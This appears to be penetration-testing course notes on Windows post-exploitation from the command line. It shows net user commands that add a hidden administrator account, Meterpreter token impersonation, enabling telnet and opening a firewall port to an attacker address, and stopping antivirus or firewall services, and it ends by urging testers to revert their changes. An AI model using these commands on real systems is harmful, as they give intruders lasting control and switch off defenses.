Why do you need to know this
    * When you exploit windows hosts over a network, you may or may not be able to have remote desktop
    * Also you may not want to use remote desktop to increase your stealth
    * Sometimes your only option is to use the command line to achieve your goals
    * Being able to manipulate the system services, users group permissions, and firewall settings can be valuable

Make Victims work for you
    * Make it work for you
    * Good pentesters need to use the same kinds of techniques botnet providers use to maintain persistence and control when they take over machines
    * If the machine is easily accessible to you thats good. You may want to create or manipulate users and local groups
    * Well configured victim machines willl be running few services. You need to get them to start services up for you to ease your task

Users are good, add them as necessary
    * See what users exist
        - net user
    * Use the net command to add users
        - net user [username][password] /add
        - net user haxox Password /add
    * Make an inactive user active
        - net user guest /active yes
    * Inactivate an active user
        - net user Administrator /active no

Groups are good too
    * See what local groups are available
        - net LocalGroup
    * if this fails to work, see next page
    * Service-specific groups exist as well, for things like RDP
    * The telnetClient group identifies those uers who can connect using telnet
        - net LocalGroup TelnetClients /add
        - net LocalGroup TelnetClients hexor /add
    * Other groups identify users that have specific privileges
        - net LocalGroup Administrator haxor /add

If net localgroup DOESNT work
    * Your meterpreter may be running as NT AUTHORITY\SYSTEM
    * Check by executing
        - getuid
    * If running a command yields a 1312 error and you are in the meterpreter context, you may be able to overcome this by issuing this command:
        - use incognito impersonate_token "NT AUTHORITY\NETWORK SERVICE"
    * Then starting a shell and issuing the command may work for you 

Some especially useful services
    * TELNET    * SSH       * VNC       * RDP

Starting/stopping services
    * sc.exe (service control manager) provices comprehensive control over services
        - start     -stop       -query     -configure

How to enable telnet services
    * see if its already running
        - sc query tlntsvr
    * configure telnet to start on demand
        - sc config tlntsvr start= demand
    * Start the service up
        - sc start tlntsvr
    * Open a firewall connection
        - netsh firewall add portopening protocol= TCP
            port= 23 name= telnet mode= enable
            scope= custom address= [AttackeIPAddress]
        
Other uses of SC
    * you can view all configured services with 
        - sc query
    * You can stop or even delete services such as firewalls, antivirus, etc
        - typiccaly it is better to stop a service rather than delete it
        - You should restart when you are done

When you are finished, clean up
    * Any changes you make to break system you must revert when you are done
    * You may introduce vulernabilites that can be exploited by other attackers
    * Before completing your penetration test:
        - if you stop any services, restart them
        - if you start any services, stop them
        - if you open any firewall ports, close them
        - etc
    * Keep a comprehensive list of all changes you made 

Windows Management Interface Command-Line
    * VMIC lets you consult and configure a huge range of information and settings on local or multiple remote machines
    * Command exmple:
        - WMIC service where state='running' get caption, name, state
            > services.tsv
